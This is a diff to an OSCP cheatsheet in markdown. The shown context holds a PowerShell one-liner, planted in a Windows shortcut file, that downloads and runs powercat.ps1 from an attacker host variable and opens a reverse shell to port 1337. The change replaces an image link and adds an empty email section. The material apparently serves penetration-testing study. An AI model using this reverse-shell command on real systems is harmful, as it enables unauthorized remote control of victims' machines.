@@ -46,4 +46,9 @@ Create a shortcut file (from Windows desktop), with a reverse shell command:
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI:8888/powercat.ps1');powercat -c $KALI -p 1337 -e powershell"
 ```
 
-![shortcut](https://test "shortcut")
+![shortcut](https://github.com/roccosicilia/OSCP_cheatsheet/blob/main/assets/link-file-reverse-shell.png?raw=true "shortcut")
+
+Send email via mail server:
+``` bash
+
+```
